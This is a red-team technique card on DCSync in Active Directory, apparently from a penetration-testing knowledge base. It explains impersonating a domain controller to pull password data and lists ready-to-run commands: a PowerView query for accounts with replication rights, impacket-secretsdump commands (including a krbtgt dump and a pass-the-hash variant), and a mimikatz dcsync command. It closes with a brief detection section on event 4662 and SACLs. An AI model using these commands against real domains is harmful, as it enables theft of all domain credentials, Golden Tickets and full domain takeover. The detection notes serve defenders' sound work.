---
id: dcsync
type: technique
label: "DCSync"
phase: "persist"
tools: ["mimikatz", "impacket"]
cve: null
detect: "4662 with the replication-GUID access mask, from a non-DC source."
mitre: "T1003.006"
tag: null
---


# DCSync

### Affected object / attribute
**Domain NC root** — extended rights **`DS-Replication-Get-Changes`** and **`DS-Replication-Get-Changes-All`**.

### Concept (deep)
Impersonate a DC over **MS-DRSR**. A real DC replicates password data to you if your principal holds the replication rights. No LSASS touch. By default only **Domain Admins**, **Enterprise Admins**, and **DC machine accounts** hold these rights, but they are often delegated to backup/service accounts.

### Attack flow (Mermaid)
```mermaid
sequenceDiagram
    participant A as principal with repl rights
    participant DC
    A->>DC: DRSUAPI GetNCChanges
    DC-->>A: NTLM hashes, Kerberos keys, pwd history
    A->>A: krbtgt → Golden; DA hash → PTH
```

### Exhaustive commands
```bash
# ── Find who has DCSync rights ──────────────────────────────────────
Get-DomainObjectAcl -Identity "DC=corp,DC=local" -ResolveGUIDs |
  ? {$_.ObjectAceType -eq "DS-Replication-Get-Changes-All"}

# ── Impacket ─────────────────────────────────────────────────────────
impacket-secretsdump corp.local/svc:'Password123!'@10.10.10.5 -just-dc
impacket-secretsdump corp.local/svc:'Password123!'@10.10.10.5 -just-dc-user krbtgt

# ── Mimikatz ─────────────────────────────────────────────────────────
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt

# ── Pass-the-Hash into secretsdump ───────────────────────────────────
impacket-secretsdump corp.local/svc@10.10.10.5 \
  -hashes aad3b435b51404eeaad3b435b51404ee:<nt> -just-dc
```

### Impact
**krbtgt** → Golden Ticket; **DA hash** → PTH; **any user hash** → offline crack / lateral.

### Detection
**4662** with replication GUID **`1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`** from a **non-DC machine account**. Apply a **SACL** to the domain NC root for the replication rights.

---
